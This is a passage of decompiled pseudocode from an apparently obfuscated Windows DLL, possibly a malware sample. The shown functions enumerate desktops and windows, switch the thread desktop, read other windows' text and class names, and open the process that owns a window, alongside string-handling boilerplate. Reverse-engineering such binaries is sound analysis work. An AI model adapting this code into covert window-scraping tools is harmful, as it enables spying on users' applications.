    sub_10012C8B(dword_100957D8, v4);
    v6 = 0;
    if ( !dword_10091D5C )
    {
      v2 = operator new(8u);
      Block = v2;
      LOBYTE(v6) = 1;
      if ( v2 )
      {
        v2 = sub_1001DCFD(v2);
        v3 = (int)v2;
      }
      else
      {
        v3 = 0;
      }
      LOBYTE(v6) = 0;
      _InterlockedExchange((volatile __int32 *)&Block, (__int32)v2);
      dword_10091D5C = v3;
      dword_10092424 = v3;
    }
    v6 = -1;
    return sub_10012CBF(v4);
  }
  return result;
}
// 10091D5C: using guessed type int dword_10091D5C;
// 10092424: using guessed type int dword_10092424;
// 100957D8: using guessed type int dword_100957D8[9];
// 1000922C: using guessed type _DWORD var_18[2];

//----- (100092CE) --------------------------------------------------------
_DWORD *__usercall sub_100092CE@<eax>(_DWORD *a1@<esi>)
{
  DWORD CurrentThreadId; // eax
  HDESK ThreadDesktop; // eax
  HDESK v3; // eax
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-Ch] BYREF

  a1[1] = 0;
  a1[2] = 0;
  *a1 = &off_100731EC;
  CurrentThreadId = GetCurrentThreadId();
  ThreadDesktop = GetThreadDesktop(CurrentThreadId);
  a1[1] = ThreadDesktop;
  if ( !ThreadDesktop || (v3 = OpenDesktopA(lpszDesktop, 0, 0, 0x2000000u), (a1[2] = v3) == 0) || !SetThreadDesktop(v3) )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return a1;
}
// 100731EC: using guessed type int (__thiscall *off_100731EC)(void *Block, char);
// 100092CE: using guessed type _DWORD pExceptionObject[3];

//----- (10009339) --------------------------------------------------------
void *__thiscall sub_10009339(void *Block, char a2)
{
  sub_100093FA(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10009355) --------------------------------------------------------
void __thiscall sub_10009355(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // ecx

  v1 = *(_DWORD *)(*this + 4);
  v2 = this + 2;
  *(_DWORD *)((char *)v2 + v1 - 8) = &off_100731F0;
  sub_1000DF1A(v2);
}
// 100731F0: using guessed type int (__stdcall *off_100731F0)(char);

//----- (1000936A) --------------------------------------------------------
_DWORD *__thiscall sub_1000936A(_DWORD *this, _DWORD *a2, int a3)
{
  int v4; // eax

  if ( a3 )
  {
    *this = &unk_100731F8;
    if ( a2 )
      v4 = (int)a2 + *(_DWORD *)(*a2 + 4);
    else
      v4 = 0;
    sub_1000DEB4(this + 2, v4);
  }
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_100731F0;
  this[1] = a2[1];
  return this;
}
// 100731F0: using guessed type int (__stdcall *off_100731F0)(char);

//----- (100093DB) --------------------------------------------------------
char *__thiscall sub_100093DB(_DWORD *this, char a2)
{
  char *v2; // esi

  v2 = (char *)(this - 2);
  sub_10009355(this - 2);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (100093FA) --------------------------------------------------------
BOOL __thiscall sub_100093FA(void *this)
{
  HDESK v3; // [esp-4h] [ebp-8h]

  v3 = (HDESK)*((_DWORD *)this + 1);
  *(_DWORD *)this = &off_100731EC;
  SetThreadDesktop(v3);
  return CloseDesktop(*((HDESK *)this + 2));
}
// 100731EC: using guessed type int (__thiscall *off_100731EC)(void *Block, char);

//----- (10009417) --------------------------------------------------------
int *sub_10009417()
{
  dword_10092400 = 0;
  dword_100923F8 = 40;
  dword_100923FC = 10;
  return &dword_100923F8;
}
// 100923F8: using guessed type int dword_100923F8;
// 100923FC: using guessed type int dword_100923FC;
// 10092400: using guessed type int dword_10092400;

//----- (10009438) --------------------------------------------------------
int sub_10009438()
{
  int result; // eax
  int v1; // [esp+0h] [ebp-24h] BYREF
  _DWORD pExceptionObject[6]; // [esp+Ch] [ebp-18h] BYREF

  pExceptionObject[2] = &v1;
  result = dword_100923FC - 1;
  if ( dword_10092400 == dword_100923FC - 1 )
  {
    pExceptionObject[5] = 0;
    sub_10014CC5((int)&unk_100954F8, 40, 0);
    sub_1000DF56(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVLahgnutrUrbccmcrf_sr__);
  }
  ++dword_10092400;
  return result;
}
// 100923FC: using guessed type int dword_100923FC;
// 10092400: using guessed type int dword_10092400;

//----- (100094AA) --------------------------------------------------------
BOOL __stdcall fn(HWND hWnd, _DWORD *a2)
{
  _DWORD *v2; // esi
  void (__cdecl *v3)(HWND); // esi

  v2 = a2;
  if ( a2 )
  {
    if ( (dword_1009579C & 1) == 0 )
    {
      dword_1009579C |= 1u;
      sub_10009417();
    }
    sub_10009438();
    if ( !*((_BYTE *)v2 + 8) || IsWindowVisible(hWnd) )
    {
      (*(void (__thiscall **)(_DWORD, HWND *))(*(_DWORD *)*v2 + 36))(*v2, &hWnd);
      v3 = (void (__cdecl *)(HWND))v2[1];
      if ( v3 )
        v3(hWnd);
    }
  }
  return 1;
}
// 1009579C: using guessed type int dword_1009579C;

//----- (1000951B) --------------------------------------------------------
BOOL __stdcall EnumFunc(const CHAR *a1, LPARAM lParam)
{
  HDESK v2; // eax
  HDESK v3; // esi

  v2 = OpenDesktopA(a1, 0, 0, 0x80000000);
  v3 = v2;
  if ( v2 )
  {
    EnumDesktopWindows(v2, (WNDENUMPROC)fn, lParam);
    CloseDesktop(v3);
  }
  return 1;
}

//----- (10009590) --------------------------------------------------------
BOOL __userpurge sub_10009590@<eax>(LPARAM a1@<esi>, LPARAM a2)
{
  HWINSTA ProcessWindowStation; // eax
  LPARAM lParam[3]; // [esp+4h] [ebp-Ch] BYREF

  (*(void (__thiscall **)(LPARAM))(*(_DWORD *)a1 + 52))(a1);
  lParam[2] = 1;
  lParam[1] = a2;
  lParam[0] = a1;
  ProcessWindowStation = GetProcessWindowStation();
  return EnumDesktopsA(ProcessWindowStation, (DESKTOPENUMPROCA)EnumFunc, (LPARAM)lParam);
}

//----- (100095CD) --------------------------------------------------------
BOOL __userpurge sub_100095CD@<eax>(LPARAM a1@<esi>, HWND hWndParent)
{
  LPARAM lParam[3]; // [esp+4h] [ebp-Ch] BYREF

  (*(void (__thiscall **)(LPARAM))(*(_DWORD *)a1 + 52))(a1);
  lParam[2] = 0;
  lParam[0] = a1;
  lParam[1] = (LPARAM)sub_1000490E;
  return EnumChildWindows(hWndParent, (WNDENUMPROC)fn, (LPARAM)lParam);
}

//----- (10009607) --------------------------------------------------------
void __stdcall sub_10009607(int *a1)
{
  sub_10014C9D(a1);
}

//----- (1000962B) --------------------------------------------------------
void *__cdecl sub_1000962B(void *a1, HWND hWnd)
{
  _DWORD *v2; // eax
  int v4[3]; // [esp+8h] [ebp-20h] BYREF
  int v5; // [esp+14h] [ebp-14h]
  DWORD dwProcessId; // [esp+18h] [ebp-10h] BYREF
  int v7; // [esp+24h] [ebp-4h]

  v7 = 0;
  v5 = 0;
  dwProcessId = 0;
  GetWindowThreadProcessId(hWnd, &dwProcessId);
  v2 = sub_1001EE7C(dwProcessId, v4, 0x410u);
  v7 = 1;
  (*(void (__thiscall **)(_DWORD *, void *))(*v2 + 72))(v2, a1);
  v5 = 1;
  LOBYTE(v7) = 0;
  sub_10009696(v4);
  return a1;
}
// 1000962B: using guessed type int var_20[3];

//----- (10009696) --------------------------------------------------------
void __stdcall sub_10009696(int *a1)
{
  sub_10009607(a1);
}

//----- (100096BA) --------------------------------------------------------
_DWORD *__cdecl sub_100096BA(_DWORD *a1, HWND hWnd)
{
  wchar_t lParam[256]; // [esp+8h] [ebp-220h] BYREF
  _DWORD pExceptionObject[3]; // [esp+208h] [ebp-20h] BYREF
  ULONG_PTR dwResult[2]; // [esp+214h] [ebp-14h] BYREF

  dwResult[1] = 0;
  memset(lParam, 0, sizeof(lParam));
  dwResult[0] = 0;
  if ( SendMessageTimeoutW(hWnd, 0xDu, 0xFFu, (LPARAM)lParam, 0, 0x3E8u, dwResult) )
  {
    sub_10009D2C(a1, lParam);
  }
  else
  {
    if ( GetLastError() )
    {
      sub_1000E2E3(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
    }
    sub_10009F32(a1, (int)&unk_10095514);
  }
  return a1;
}
// 100096BA: using guessed type _DWORD pExceptionObject[3];

//----- (1000976E) --------------------------------------------------------
_DWORD *__cdecl sub_1000976E(_DWORD *a1, HWND hWnd)
{
  WCHAR ClassName[256]; // [esp+0h] [ebp-21Ch] BYREF
  _DWORD pExceptionObject[4]; // [esp+200h] [ebp-1Ch] BYREF

  pExceptionObject[3] = 0;
  memset(ClassName, 0, sizeof(ClassName));
  if ( !GetClassNameW(hWnd, ClassName, 255) )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  sub_10009D2C(a1, ClassName);
  return a1;
}

//----- (100097FA) --------------------------------------------------------
errno_t __usercall sub_100097FA@<eax>(int a1@<eax>, void *Destination, int a3, void *Source)
{
  return memcpy_s(Destination, 2 * a3, Source, 2 * a1);
}

//----- (10009816) --------------------------------------------------------
char *__cdecl sub_10009816(char *a1)
{
  unsigned int v1; // ecx
  char v2; // cf
  unsigned int v3; // ecx
  char *v4; // edi
  int i; // ecx

  if ( v1 )
  {
    v2 = v1 & 1;
    v3 = v1 >> 1;
    memset32(a1, 2097184, v3);
    v4 = &a1[4 * v3];
    for ( i = v2; i; --i )
    {
      *(_WORD *)v4 = 32;
      v4 += 2;
    }
  }
  return a1;
}
// 1000981B: variable 'v1' is possibly undefined

//----- (1000983A) --------------------------------------------------------
errno_t __userpurge sub_1000983A@<eax>(int a1@<esi>, wchar_t *Source)
{
  size_t v2; // eax
  wchar_t *v3; // eax
  errno_t result; // eax
  rsize_t v5; // [esp-10h] [ebp-10h]
  const wchar_t *v6; // [esp-Ch] [ebp-Ch]
  const wchar_t *v7; // [esp-4h] [ebp-4h]

  v7 = Source;
  *(_DWORD *)(a1 + 16) = 0;
  *(_BYTE *)(a1 + 24) = 0;
  *(_DWORD *)(a1 + 20) = 0;
  v2 = wcslen(v7);
  *(_DWORD *)(a1 + 28) = v2;
  *(_DWORD *)(a1 + 32) = v2;
  v3 = (wchar_t *)operator new(2 * (v2 + 1));
  v6 = Source;
  v5 = *(_DWORD *)(a1 + 28) + 1;
  *(_DWORD *)(a1 + 12) = v3;
  result = wcscpy_s(v3, v5, v6);
  if ( result )
  {
    sub_1000DEEF(&Source);
    _CxxThrowException(&Source, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  return result;
}

//----- (1000989D) --------------------------------------------------------
_DWORD *__cdecl sub_1000989D(_DWORD *a1)
{
  int *v1; // ecx
  int *v2; // edi
  unsigned int v3; // ebx
  _DWORD *v4; // eax
  _DWORD *v5; // eax
  int v7[5]; // [esp+10h] [ebp-24h] BYREF
  int v8; // [esp+24h] [ebp-10h]
  int v9; // [esp+30h] [ebp-4h]

  v2 = v1;
  v8 = 0;
  v3 = v1[3];
  if ( v3 < 2 )
    goto LABEL_8;
  if ( sub_1000C7D0(v1) != -257 )
  {
    if ( v3 >= 4 && sub_1000C77C(v2, 0) == 0xFFFF )
    {
      v5 = (_DWORD *)sub_1000C709(v3 - 4, v2, (int)v7, 4);
      v9 = 2;
      sub_10009DF1(v5, a1);
      v8 = 1;
      goto LABEL_4;
    }
LABEL_8:
    sub_10009F06(a1);
    v9 = 0;
    v8 = 1;
    return a1;
  }
  v4 = (_DWORD *)sub_1000C709(v3 - 2, v2, (int)v7, 2);
  v9 = 1;
  sub_10009DF1(v4, a1);
  v8 = 1;
LABEL_4:
  LOBYTE(v9) = 0;
  sub_1000C45D(v7);
  return a1;
}
// 100098A9: variable 'v1' is possibly undefined
// 1000989D: using guessed type int var_24[5];

//----- (10009952) --------------------------------------------------------
_DWORD *__userpurge sub_10009952@<eax>(int a1@<edi>, _DWORD *a2)
{
  size_t v2; // eax
  const void *v3; // ebx
  int v4; // eax
  size_t v6; // [esp-4h] [ebp-24h]

  v2 = sub_1000A1F9(a1);
  sub_1000C28D((void *)(2 * v2 + 2), (int)a2, 0);
  sub_1000C7EE(a2, 65279);
  v3 = *(const void **)(*(_DWORD *)(a1 + 4) + 12);
  v6 = 2 * sub_1000A1F9(a1);
  v4 = sub_1000C50A(a2);
  memcpy((void *)(v4 + 2), v3, v6);
  *(_BYTE *)(a2[1] + 8) = 1;
  return a2;
}

//----- (100099C4) --------------------------------------------------------
errno_t __userpurge sub_100099C4@<eax>(int a1@<esi>, wchar_t *String, wchar_t *Source)
{
  size_t v3; // edi
  size_t v4; // eax
  wchar_t *v5; // eax
  errno_t result; // eax
  rsize_t v7; // [esp-14h] [ebp-18h]
  const wchar_t *v8; // [esp-10h] [ebp-14h]
  const wchar_t *v9; // [esp-4h] [ebp-8h]

  v9 = String;
  *(_DWORD *)(a1 + 16) = 0;
  *(_BYTE *)(a1 + 24) = 0;
  *(_DWORD *)(a1 + 20) = 0;
  v3 = wcslen(v9);
  v4 = v3 + wcslen(Source);
  *(_DWORD *)(a1 + 28) = v4;
  *(_DWORD *)(a1 + 32) = v4;
  v5 = (wchar_t *)operator new(2 * (v4 + 1));
  v8 = String;
  v7 = *(_DWORD *)(a1 + 28) + 1;
  *(_DWORD *)(a1 + 12) = v5;
  if ( wcscpy_s(v5, v7, v8) || (result = wcscat_s(*(wchar_t **)(a1 + 12), *(_DWORD *)(a1 + 28) + 1, Source)) != 0 )
  {
    sub_1000DEEF(&String);
    _CxxThrowException(&String, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  return result;
}

//----- (10009A4C) --------------------------------------------------------
int __userpurge sub_10009A4C@<eax>(int a1@<edi>, int a2)
{
  char *v2; // eax

  *(_DWORD *)a2 = &off_1007332C;
  *(_DWORD *)(a2 + 4) = 0;
  *(_BYTE *)(a2 + 8) = 1;
  *(_DWORD *)a2 = &off_10073208;
  v2 = (char *)operator new(2 * (a1 + 1));
  *(_DWORD *)(a2 + 12) = v2;
  *(_DWORD *)(a2 + 16) = 0;
  *(_DWORD *)(a2 + 20) = 0;
  *(_BYTE *)(a2 + 24) = 0;
  *(_DWORD *)(a2 + 28) = a1;
  *(_DWORD *)(a2 + 32) = a1;
  sub_10009816(v2);
  *(_WORD *)(*(_DWORD *)(a2 + 12) + 2 * *(_DWORD *)(a2 + 28)) = 0;
  return a2;
}
// 10073208: using guessed type int (__thiscall *off_10073208)(void *Block, char);
// 1007332C: using guessed type void (__noreturn *off_1007332C)();

//----- (10009ABE) --------------------------------------------------------
void *__thiscall sub_10009ABE(void *Block, char a2)
{
  sub_10009CD3((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10009ADE) --------------------------------------------------------
int __stdcall sub_10009ADE(int a1, wchar_t *Source)
{
  *(_DWORD *)a1 = &off_1007332C;
  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 8) = 1;
  *(_DWORD *)a1 = &off_10073208;
  sub_1000983A(a1, Source);
  return a1;
}
// 10073208: using guessed type int (__thiscall *off_10073208)(void *Block, char);
// 1007332C: using guessed type void (__noreturn *off_1007332C)();

//----- (10009B1B) --------------------------------------------------------
int __stdcall sub_10009B1B(int a1, int a2)
{
  *(_DWORD *)a1 = &off_1007332C;
  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 8) = 1;
  *(_DWORD *)a1 = &off_10073208;
  sub_1000983A(a1, *(wchar_t **)(a2 + 12));
  return a1;
}
// 10073208: using guessed type int (__thiscall *off_10073208)(void *Block, char);
// 1007332C: using guessed type void (__noreturn *off_1007332C)();

//----- (10009B5B) --------------------------------------------------------
int __stdcall sub_10009B5B(int a1, wchar_t *String, wchar_t *Source)
{
  *(_DWORD *)a1 = &off_1007332C;
  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 8) = 1;
  *(_DWORD *)a1 = &off_10073208;
  sub_100099C4(a1, String, Source);
  return a1;
}
// 10073208: using guessed type int (__thiscall *off_10073208)(void *Block, char);
// 1007332C: using guessed type void (__noreturn *off_1007332C)();

//----- (10009B9B) --------------------------------------------------------
int __stdcall sub_10009B9B(int a1, char *String, size_t MaxCount)
{
  size_t v3; // eax
  WCHAR *v4; // eax
  int v5; // ecx
  _DWORD pExceptionObject[6]; // [esp+10h] [ebp-18h] BYREF

  *(_DWORD *)a1 = &off_1007332C;
  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 8) = 1;
  pExceptionObject[5] = 0;
  *(_DWORD *)a1 = &off_10073208;
  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 20) = 0;
  *(_BYTE *)(a1 + 24) = 0;
  v3 = strnlen(String, MaxCount);
  *(_DWORD *)(a1 + 28) = v3;
  *(_DWORD *)(a1 + 32) = v3;
  v4 = (WCHAR *)operator new(2 * (v3 + 1));
  v5 = *(_DWORD *)(a1 + 28);
  *(_DWORD *)(a1 + 12) = v4;
  if ( v5 && !MultiByteToWideChar(0, 0, String, v5, v4, v5 + 1) )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  *(_WORD *)(*(_DWORD *)(a1 + 12) + 2 * *(_DWORD *)(a1 + 28)) = 0;
  return a1;
}
// 10073208: using guessed type int (__thiscall *off_10073208)(void *Block, char);
// 1007332C: using guessed type void (__noreturn *off_1007332C)();

//----- (10009C43) --------------------------------------------------------
void __usercall sub_10009C43(int a1@<esi>)
{
  int v1; // eax
  _DWORD pExceptionObject[3]; // [esp+4h] [ebp-Ch] BYREF

  if ( !*(_BYTE *)(a1 + 24) || !*(_BYTE *)(a1 + 8) )
  {
    if ( *(_DWORD *)(a1 + 16) && *(_DWORD *)(a1 + 28) != *(_DWORD *)(a1 + 20) )
    {
      j__free(*(void **)(a1 + 16));
      *(_DWORD *)(a1 + 16) = operator new(*(_DWORD *)(a1 + 28) + 1);
      *(_DWORD *)(a1 + 20) = *(_DWORD *)(a1 + 28);
    }
    if ( !*(_DWORD *)(a1 + 16) )
    {
      v1 = *(_DWORD *)(a1 + 28);
      *(_DWORD *)(a1 + 20) = v1;
      *(_DWORD *)(a1 + 16) = operator new(v1 + 1);
    }
    if ( !WideCharToMultiByte(
            0,
            0,
            *(LPCWCH *)(a1 + 12),
            *(_DWORD *)(a1 + 28) + 1,
            *(LPSTR *)(a1 + 16),
            *(_DWORD *)(a1 + 20) + 1,
            0,
            0) )
    {
      sub_1000E2E3(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
    }
    *(_BYTE *)(a1 + 24) = 1;
  }
}
// 10009C43: using guessed type _DWORD pExceptionObject[3];

//----- (10009CD3) --------------------------------------------------------
void __stdcall sub_10009CD3(int a1)
{
  *(_DWORD *)a1 = &off_10073208;
  j__free(*(void **)(a1 + 12));
  if ( *(_DWORD *)(a1 + 16) )
    j__free(*(void **)(a1 + 16));
  *(_DWORD *)a1 = &off_1007332C;
}
// 10073208: using guessed type int (__thiscall *off_10073208)(void *Block, char);
// 1007332C: using guessed type void (__noreturn *off_1007332C)();

//----- (10009D2C) --------------------------------------------------------
_DWORD *__stdcall sub_10009D2C(_DWORD *a1, wchar_t *Source)
{
  void *v2; // eax
  int v3; // eax

  *a1 = off_10073204;
  v2 = operator new(0x24u);
  if ( v2 )
    v3 = sub_10009ADE((int)v2, Source);
  else
    v3 = 0;
  a1[1] = v3;
  sub_10002B4A(a1 + 1);
  return a1;
}
// 10073204: using guessed type int (__thiscall *off_10073204[2])(void *, char);

//----- (10009D9C) --------------------------------------------------------
_DWORD *__userpurge sub_10009D9C@<eax>(int a1@<edi>, _DWORD *a2)
{
  void *v2; // eax
  int v3; // eax

  *a2 = off_10073204;
  v2 = operator new(0x24u);
  if ( v2 )
    v3 = sub_10009A4C(a1, (int)v2);
  else
    v3 = 0;
  a2[1] = v3;
  sub_10002B4A(a2 + 1);
  return a2;
}
// 10073204: using guessed type int (__thiscall *off_10073204[2])(void *, char);

//----- (10009DF1) --------------------------------------------------------
_DWORD *__userpurge sub_10009DF1@<eax>(_DWORD *a1@<ebx>, _DWORD *a2)
{
  int v2; // eax
  const wchar_t *v3; // eax
  int v4; // eax
  _DWORD *v5; // esi
  unsigned int v6; // eax
  void *v7; // eax
  int v8; // edx
  size_t v10; // [esp-4h] [ebp-24h]
  int pExceptionObject[3]; // [esp+10h] [ebp-10h] BYREF
  int v12; // [esp+1Ch] [ebp-4h]

  *a2 = off_10073204;
  pExceptionObject[0] = (int)operator new(0x24u);
  v2 = 0;
  v12 = 0;
  if ( pExceptionObject[0] )
  {
    v10 = a1[3] >> 1;
    v3 = (const wchar_t *)sub_1000C52E(a1);
    v4 = wcsnlen(v3, v10);
    v2 = sub_10009A4C(v4, pExceptionObject[0]);
  }
  v5 = a2 + 1;
  a2[1] = v2;
  sub_10002B4A(a2 + 1);
  v12 = 1;
  v6 = a1[3];
  if ( (v6 & 1) != 0 && v6 >> 1 <= *(_DWORD *)(*v5 + 28) )
  {
    sub_1000DEEF(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v7 = (void *)sub_1000C52E(a1);
  sub_100097FA(*(_DWORD *)(v8 + 28), *(void **)(v8 + 12), *(_DWORD *)(v8 + 28), v7);
  *(_WORD *)(*(_DWORD *)(*v5 + 12) + 2 * *(_DWORD *)(*v5 + 28)) = 0;
  return a2;
}
// 10009E81: variable 'v8' is possibly undefined
// 10073204: using guessed type int (__thiscall *off_10073204[2])(void *, char);

//----- (10009EAB) --------------------------------------------------------
_DWORD *__thiscall sub_10009EAB(_DWORD *this, _DWORD *a2)
{
  int v3; // eax
  char *v4; // eax
  size_t v6; // [esp-4h] [ebp-24h]
  void *Block; // [esp+10h] [ebp-10h]

  *a2 = off_10073204;
  Block = operator new(0x24u);
  v3 = 0;
  if ( Block )
  {
    v6 = this[3];
    v4 = (char *)sub_1000C52E(this);
    v3 = sub_10009B9B((int)Block, v4, v6);
  }
  a2[1] = v3;
  sub_10002B4A(a2 + 1);
  return a2;
}
// 10073204: using guessed type int (__thiscall *off_10073204[2])(void *, char);

//----- (10009F06) --------------------------------------------------------
_DWORD *__cdecl sub_10009F06(_DWORD *a1)
{
  _DWORD *v1; // ecx

  sub_10009EAB(v1, a1);
  return a1;
}
// 10009F19: variable 'v1' is possibly undefined

//----- (10009F32) --------------------------------------------------------
_DWORD *__stdcall sub_10009F32(_DWORD *a1, int a2)
{
  *a1 = off_10073204;
  a1[1] = *(_DWORD *)(a2 + 4);
  sub_10002B4A(a1 + 1);
  return a1;
}
// 10073204: using guessed type int (__thiscall *off_10073204[2])(void *, char);

//----- (10009F65) --------------------------------------------------------
void __thiscall sub_10009F65(int *this)
{
  *this = (int)off_10073204;
  sub_1000B345(this + 1);
}
// 10073204: using guessed type int (__thiscall *off_10073204[2])(void *, char);

//----- (10009F8D) --------------------------------------------------------
_DWORD *__stdcall sub_10009F8D(_DWORD *a1)
{
  void *v1; // eax
  int v2; // eax

  *a1 = off_10073204;
  v1 = operator new(0x24u);
  if ( v1 )
    v2 = sub_10009B9B((int)v1, String, 0x7FFFFFFFu);
  else
    v2 = 0;
  a1[1] = v2;
  sub_10002B4A(a1 + 1);
  return a1;
}
// 10073204: using guessed type int (__thiscall *off_10073204[2])(void *, char);

//----- (10009FE5) --------------------------------------------------------
int __usercall sub_10009FE5@<eax>(int a1@<edi>)
{
  sub_10009C43(*(_DWORD *)(a1 + 4));
  return *(_DWORD *)(*(_DWORD *)(a1 + 4) + 16);
}

//----- (10009FF6) --------------------------------------------------------
_DWORD *__cdecl sub_10009FF6(_DWORD *a1)
{
  sub_10009F8D(a1);
  return a1;
}

//----- (1000A02D) --------------------------------------------------------
char __thiscall sub_1000A02D(int *this)
{
  int *v1; // edi
  int v2; // eax
  char v3; // bl
  void *v4; // eax
  void *Block[3]; // [esp+10h] [ebp-10h] BYREF
  int v7; // [esp+1Ch] [ebp-4h]

  v1 = this + 1;
  v2 = this[1];
  v3 = *(_BYTE *)(v2 + 8);
  if ( *(_DWORD *)(v2 + 4) > 1u )
  {
    Block[0] = operator new(0x24u);
    v4 = 0;
    v7 = 0;
    if ( Block[0] )
      v4 = (void *)sub_10009ADE((int)Block[0], *(wchar_t **)(*v1 + 12));
    v7 = -1;
    Block[0] = v4;
    sub_10002B4A((int *)Block);
    v7 = 1;
    sub_100021B1((int *)Block, v1);
    v7 = -1;
    sub_1000B345((int *)Block);
  }
  *(_BYTE *)(*v1 + 8) = 0;
  *(_BYTE *)(*v1 + 24) = 0;
  return v3;
}

//----- (1000A0AA) --------------------------------------------------------
int __userpurge sub_1000A0AA@<eax>(int *a1@<esi>, int a2)
{
  sub_1000A02D(a1);
  return *(_DWORD *)(a1[1] + 12) + 2 * a2;
}

//----- (1000A0C4) --------------------------------------------------------
int __userpurge sub_1000A0C4@<eax>(int a1@<ebx>, int a2)
{
  int v2; // eax
  void *Block; // [esp+10h] [ebp-10h]

  Block = operator new(0x24u);
  v2 = 0;
  if ( Block )
    v2 = sub_10009B5B((int)Block, *(wchar_t **)(*(_DWORD *)(a1 + 4) + 12), *(wchar_t **)(*(_DWORD *)(a2 + 4) + 12));
  a2 = v2;
  sub_10002B4A(&a2);
  sub_100021B1(&a2, (int *)(a1 + 4));
  sub_1000B345(&a2);
  return a1;
}

//----- (1000A132) --------------------------------------------------------
_DWORD *__cdecl sub_1000A132(_DWORD *a1, int a2, int a3)
{
  sub_10009F32(a1, a2);
  sub_1000A0C4((int)a1, a3);
  return a1;
}

//----- (1000A1A2) --------------------------------------------------------
bool __usercall sub_1000A1A2@<al>(int a1@<eax>, int a2@<ecx>)
{
  return sub_1000A1C0(a1, a2) < 0;
}

//----- (1000A1C0) --------------------------------------------------------
int __usercall sub_1000A1C0@<eax>(int a1@<eax>, int a2@<ecx>)
{
  int v2; // eax
  const wchar_t *v3; // edx

  v2 = *(_DWORD *)(a1 + 4);
  v3 = *(const wchar_t **)(*(_DWORD *)(a2 + 4) + 12);
  if ( v3 == *(const wchar_t **)(v2 + 12) )
    return 0;
  else
    return wcscmp(v3, *(const wchar_t **)(v2 + 12));
}

//----- (1000A1E4) --------------------------------------------------------
int __usercall sub_1000A1E4@<eax>(int *a1@<esi>)
{
  sub_1000A02D(a1);
  return *(_DWORD *)(a1[1] + 12);
}

//----- (1000A1F9) --------------------------------------------------------
size_t __usercall sub_1000A1F9@<eax>(int a1@<eax>)
{
  int v1; // ecx

  v1 = *(_DWORD *)(a1 + 4);
  if ( *(_BYTE *)(v1 + 8) )
    return *(_DWORD *)(v1 + 32);
  else
    return sub_1000A20B(a1);
}

//----- (1000A20B) --------------------------------------------------------
size_t __usercall sub_1000A20B@<eax>(int a1@<eax>)
{
  return wcsnlen(*(const wchar_t **)(*(_DWORD *)(a1 + 4) + 12), *(_DWORD *)(*(_DWORD *)(a1 + 4) + 28) + 1);
}

//----- (1000A223) --------------------------------------------------------
int __usercall sub_1000A223@<eax>(int a1@<esi>)
{
  int v1; // edi
  int result; // eax

  v1 = *(_DWORD *)(a1 + 4);
  *(_DWORD *)(v1 + 32) = sub_1000A20B(a1);
  result = *(_DWORD *)(a1 + 4);
  *(_BYTE *)(result + 8) = 1;
  return result;
}

//----- (1000A28F) --------------------------------------------------------
void __usercall sub_1000A28F(int a1@<esi>, wchar_t *Format, int ArgList)
{
  _DWORD *v3; // eax
  int v4; // [esp+10h] [ebp-7E8h] BYREF
  int pExceptionObject; // [esp+14h] [ebp-7E4h] BYREF
  wchar_t Buffer[1006]; // [esp+18h] [ebp-7E0h] BYREF
  int v7; // [esp+7F4h] [ebp-4h]

  if ( _vsnwprintf_s(Buffer, 0x3E8u, 0xFFFFFFFF, Format, (va_list)&ArgList) == -1 )
  {
    sub_1000DEEF(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v3 = sub_10009D2C(&v4, Buffer);
  v7 = 0;
  sub_100021B1(v3 + 1, (int *)(a1 + 4));
  v7 = -1;
  sub_10009F65(&v4);
  sub_10056753();
}

//----- (1000A315) --------------------------------------------------------
_DWORD *__cdecl sub_1000A315(_DWORD *a1, int ArgList)
{
  _DWORD *v2; // eax
  int v3; // eax
  int v5[2]; // [esp+10h] [ebp-18h] BYREF
  int v6; // [esp+18h] [ebp-10h]
  int v7; // [esp+24h] [ebp-4h]

  v6 = 0;
  v2 = sub_10009D2C(v5, &word_1008F8A8);
  v7 = 1;
  sub_1000A28F((int)v2, a08x, ArgList);
  sub_10009F32(a1, v3);
  v6 = 1;
  LOBYTE(v7) = 0;
  sub_10009F65(v5);
  return a1;
}
// 1000A34E: variable 'v3' is possibly undefined

//----- (1000A36B) --------------------------------------------------------
_DWORD *__cdecl sub_1000A36B(_DWORD *a1, int ArgList)
{
  _DWORD *v2; // eax
  int v3; // eax
  int v5[2]; // [esp+10h] [ebp-18h] BYREF
  int v6; // [esp+18h] [ebp-10h]
  int v7; // [esp+24h] [ebp-4h]

  v6 = 0;
  v2 = sub_10009D2C(v5, &word_1008F8B8);
  v7 = 1;
  sub_1000A28F((int)v2, aD, ArgList);
  sub_10009F32(a1, v3);
  v6 = 1;
  LOBYTE(v7) = 0;
  sub_10009F65(v5);
  return a1;
}
// 1000A3A4: variable 'v3' is possibly undefined

//----- (1000A3E9) --------------------------------------------------------
